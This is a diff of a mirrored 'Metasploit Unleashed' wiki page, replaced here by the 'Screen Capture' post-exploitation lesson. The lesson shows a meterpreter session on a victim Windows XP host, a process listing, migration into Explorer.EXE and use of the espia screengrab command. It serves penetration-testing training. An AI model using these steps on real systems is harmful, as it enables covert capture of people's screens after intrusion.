@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Screen Capture - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Screen_Capture" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Screen_Capture&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Screen_Capture&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Screen_Capture&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,222 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Screen Capture</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Screen_Capture#column-one">navigation</a>, <a href="Screen_Capture#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Another feature of meterpreter is the ability to capture the victims desktop and save them on your system. Let's take a quick look at how this works. We'll already assume you have a meterpreter console, we'll take a look at what is on the victims screen.
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Trying target Windows XP SP2 - English...
+<span style='color:#0000FF;'>[*]</span> Sending stage (719360 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:34117 -> 192.168.1.104:4444)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>
+
+Process list
+============
+
+    PID   Name                 Path
+    ---   ----                 ----
+    180   notepad.exe          C:\WINDOWS\system32\notepad.exe
+    248   snmp.exe             C:\WINDOWS\System32\snmp.exe
+    260   Explorer.EXE         C:\WINDOWS\Explorer.EXE
+    284   surgemail.exe        c:\surgemail\surgemail.exe
+    332   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
+    612   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    620   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    648   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
+    664   GrooveMonitor.exe    C:\Program Files\Microsoft Office\Office12\GrooveMonitor.exe
+    728   WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
+    736   jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
+    756   msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
+    816   smss.exe             \SystemRoot\System32\smss.exe
+    832   alg.exe              C:\WINDOWS\System32\alg.exe
+    904   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
+    928   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
+    972   services.exe         C:\WINDOWS\system32\services.exe
+    984   lsass.exe            C:\WINDOWS\system32\lsass.exe
+    1152  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+    1164  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1276  nwauth.exe           c:\surgemail\nwauth.exe
+    1296  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1404  svchost.exe          C:\WINDOWS\System32\svchost.exe
+    1500  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1652  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1796  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
+    1912  3proxy.exe           C:\3proxy\bin\3proxy.exe
+    2024  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
+    2188  swatch.exe           c:\surgemail\swatch.exe
+    2444  iexplore.exe         C:\Program Files\Internet Explorer\iexplore.exe
+    3004  cmd.exe              C:\WINDOWS\system32\cmd.exe
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>migrate 260</span>
+<span style='color:#0000FF;'>[*]</span> Migrating to 260...
+<span style='color:#13C16A;'>[*]</span> Migration completed successfully.
+<u>meterpreter</u> > <span style='color:#13C16A;'>use espia</span>
+Loading extension espia...success.
+<u>meterpreter</u> > <span style='color:#13C16A;'>screengrab</span>
+Screenshot saved to: /root/nYdRUppb.jpeg
+<u>meterpreter</u> ></pre>
+<br />
+We can see how effective this was in migrating to the explorer.exe, be sure that the process your meterpreter is on has access to active desktops or this will not work. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Screen Capture</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <strong class="selflink">Screen Capture</strong> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 493/1000000
+Preprocessor generated node count: 2595/1000000
+Post‐expand include size: 4068/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:67-0!*!0!*!*!*!* and timestamp 20131124111109 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Screen_Capture&amp;oldid=81">http://www.offensive-security.com/w/index.php?title=Screen_Capture&amp;oldid=81</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +707,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.148 secs. --></body></html>
